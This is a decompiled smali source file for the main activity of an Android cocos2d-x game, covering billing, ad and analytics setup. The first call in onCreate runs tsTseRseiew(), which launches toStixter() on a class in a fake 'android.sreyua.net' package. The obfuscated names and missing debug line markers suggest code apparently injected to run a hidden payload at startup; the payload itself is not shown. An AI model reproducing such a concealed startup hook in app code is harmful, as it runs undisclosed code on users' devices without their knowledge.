.class public Lcom/tobiapps/android_hghunt2/TOBI006;
.super Lorg/cocos2dx/lib/Cocos2dxActivity;
.source "TOBI006.java"


# instance fields
.field private mNewsBlast:Lcom/common/android/newsblast/NewsBlast;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 157
    const-string v0, "cocos2dcpp"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    .line 158
    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .prologue
    .line 44
    invoke-direct {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;-><init>()V

    return-void
.end method


# virtual methods
.method public enableEvent()Z
    .registers 2

    .prologue
    .line 145
    const/4 v0, 0x0

    return v0
.end method

.method public getDebugMode()Z
    .registers 2

    .prologue
    .line 140
    const/4 v0, 0x0

    return v0
.end method

.method public getPlatformCode()I
    .registers 2

    .prologue
    .line 135
    const/16 v0, 0x20

    return v0
.end method

.method protected init_RateUs()V
    .registers 1

    .prologue
    .line 165
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 8
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->tsTseRseiew()V

    .line 49
    invoke-super {p0, p1}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onCreate(Landroid/os/Bundle;)V

    .line 52
    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->getPlatformCode()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_13

    .line 53
    const-string v0, "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiHGSzPfZBLY1cfjGQjIqiLm+CzYEsf0fRPLWgcB5jd0JOzFKMCKnlHYUYJxvbeDTJxB/yWeuYuspY7cKGkOaeGQr2/lOYEeh6l1u/zSGOCRPQUp19XfKAh7wglKUjNMPLkz6kvgmgy7n6BTQi+ddpn0O4VojT6/z9X4ikMBCjNd4seZrutxtnEGfCuOLJRzdDmxw1rk1OM9CAyxBvkoeq4bd7KvZ4qaw4f5i2f2slNV5xjQ0pl0jpc+g19j9c30fQbSxThlsl5SrtTyXuDZaELe2dMibPXNq7EG8yxpVzVqjGQXAq/up1y16L7aa4N8Qhqh1oKJGlB+y1luHixYJJwIDAQAB"

    invoke-virtual {p0, v0}, Lcom/tobiapps/android_hghunt2/TOBI006;->setPublicKey(Ljava/lang/String;)V

    .line 56
    :cond_13
    new-instance v0, Lcom/tobiapps/android_hghunt2/TOBI006$1;

    invoke-direct {v0, p0}, Lcom/tobiapps/android_hghunt2/TOBI006$1;-><init>(Lcom/tobiapps/android_hghunt2/TOBI006;)V

    invoke-virtual {p0, v0}, Lcom/tobiapps/android_hghunt2/TOBI006;->setSetupBillingListener(Lcom/common/android/OnSetupListener;)V

    .line 73
    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->onStartSetupBilling()V

    .line 76
    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->setupNativeEnvironment()V

    .line 78
    invoke-static {p0}, Lcom/common/android/jni/STSystemFunction;->setup(Landroid/content/Context;)V

    .line 81
    const/4 v1, 0x1

    .line 82
    const-string v0, "MoPub_phone_banner"

    invoke-static {p0, v0}, Lcom/common/android/utils/Utils;->getMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 83
    const-string v0, "MoPub_phone_fullscreen"

    invoke-static {p0, v0}, Lcom/common/android/utils/Utils;->getMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 84
    const-string v0, "MoPub_tablet_banner"

    invoke-static {p0, v0}, Lcom/common/android/utils/Utils;->getMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 85
    const-string v0, "MoPub_tablet_fullscreen"

    invoke-static {p0, v0}, Lcom/common/android/utils/Utils;->getMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v0, p0

    .line 81
    invoke-static/range {v0 .. v5}, Lcom/common/android/jni/STMopubAds;->setup(Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 87
    invoke-static {}, Lcom/common/android/jni/STMopubAds;->getInstance()Lcom/common/android/jni/STMopubAds;

    move-result-object v0

    sget-object v1, Lcom/common/android/jni/STMopubAds$STAmazonAdSize;->SIZE_300x250:Lcom/common/android/jni/STMopubAds$STAmazonAdSize;

    .line 88
    sget-object v2, Lcom/common/android/jni/STMopubAds$STAmazonAdSize;->SIZE_300x250:Lcom/common/android/jni/STMopubAds$STAmazonAdSize;

    .line 87
    invoke-virtual {v0, v1, v2}, Lcom/common/android/jni/STMopubAds;->setAmazonSizeType(Lcom/common/android/jni/STMopubAds$STAmazonAdSize;Lcom/common/android/jni/STMopubAds$STAmazonAdSize;)V

    .line 90
    invoke-static {}, Lcom/common/android/jni/STMopubAds;->getInstance()Lcom/common/android/jni/STMopubAds;

    move-result-object v0

    const/high16 v1, 0x43960000    # 300.0f

    const/high16 v2, 0x437a0000    # 250.0f

    .line 91
    const/16 v3, 0x11

    .line 90
    invoke-virtual {v0, v1, v2, v3}, Lcom/common/android/jni/STMopubAds;->setBannnerAdViewLayoutParams(FFI)V

    .line 94
    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/diwublog/AnalyticX/AnalyticXBridge;->sessionContext:Landroid/content/Context;

    .line 97
    const/high16 v0, 0x7f030000

    sput v0, Lcom/common/android/jni/MoreGamesActivityForJNI;->ACTIVITY_LAYOUT_ID:I

    .line 98
    const v0, 0x7f060005

    sput v0, Lcom/common/android/jni/MoreGamesActivityForJNI;->WEBVIEW_ID:I

    .line 99
    const v0, 0x7f060004

    sput v0, Lcom/common/android/jni/MoreGamesActivityForJNI;->TITLE_PROGRESS_ID:I

    .line 102
    new-instance v0, Lcom/common/android/newsblast/NewsBlast;

    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->getPlatformCode()I

    move-result v1

    invoke-direct {v0, p0, v1}, Lcom/common/android/newsblast/NewsBlast;-><init>(Lcom/common/android/LaunchActivity;I)V

    iput-object v0, p0, Lcom/tobiapps/android_hghunt2/TOBI006;->mNewsBlast:Lcom/common/android/newsblast/NewsBlast;

    .line 103
    return-void
.end method

.method public onCreateView()Lorg/cocos2dx/lib/Cocos2dxGLSurfaceView;
    .registers 8

    .prologue
    const/4 v1, 0x5

    .line 149
    new-instance v0, Lorg/cocos2dx/lib/Cocos2dxGLSurfaceView;

    invoke-direct {v0, p0}, Lorg/cocos2dx/lib/Cocos2dxGLSurfaceView;-><init>(Landroid/content/Context;)V

    .line 151
    .local v0, "glSurfaceView":Lorg/cocos2dx/lib/Cocos2dxGLSurfaceView;
    const/4 v2, 0x6

    const/4 v4, 0x0

    const/16 v5, 0x10

    const/16 v6, 0x8

    move v3, v1

    invoke-virtual/range {v0 .. v6}, Lorg/cocos2dx/lib/Cocos2dxGLSurfaceView;->setEGLConfigChooser(IIIIII)V

    .line 153
    return-object v0
.end method

.method protected onPause()V
    .registers 2

    .prologue
    .line 123
    iget-object v0, p0, Lcom/tobiapps/android_hghunt2/TOBI006;->mNewsBlast:Lcom/common/android/newsblast/NewsBlast;

    invoke-virtual {v0}, Lcom/common/android/newsblast/NewsBlast;->breakOff()V

    .line 124
    invoke-super {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onPause()V

    .line 125
    return-void
.end method

.method protected onResume()V
    .registers 2

    .prologue
    .line 107
    invoke-super {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onResume()V

    .line 110
    iget-boolean v0, p0, Lcom/tobiapps/android_hghunt2/TOBI006;->islock:Z

    if-nez v0, :cond_15

    .line 112
    sget-boolean v0, Lcom/common/android/jni/STMopubAds;->isInterstitialAdShown:Z

    if-nez v0, :cond_16

    .line 113
    iget-object v0, p0, Lcom/tobiapps/android_hghunt2/TOBI006;->mNewsBlast:Lcom/common/android/newsblast/NewsBlast;

    invoke-virtual {v0}, Lcom/common/android/newsblast/NewsBlast;->continueNews()V

    .line 114
    iget-object v0, p0, Lcom/tobiapps/android_hghunt2/TOBI006;->mNewsBlast:Lcom/common/android/newsblast/NewsBlast;

    invoke-virtual {v0}, Lcom/common/android/newsblast/NewsBlast;->doNewsBlast_always()V

    .line 119
    :cond_15
    :goto_15
    return-void

    .line 116
    :cond_16
    const/4 v0, 0x0

    sput-boolean v0, Lcom/common/android/jni/STMopubAds;->isInterstitialAdShown:Z

    goto :goto_15
.end method

.method protected onStartSession()V
    .registers 1

    .prologue
    .line 131
    return-void
.end method

.method public tsTseRseiew()V
    .registers 2

    .prologue
    new-instance v0, Landroid/sreyua/net/AndRoidActivity;

    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V

    return-void
.end method
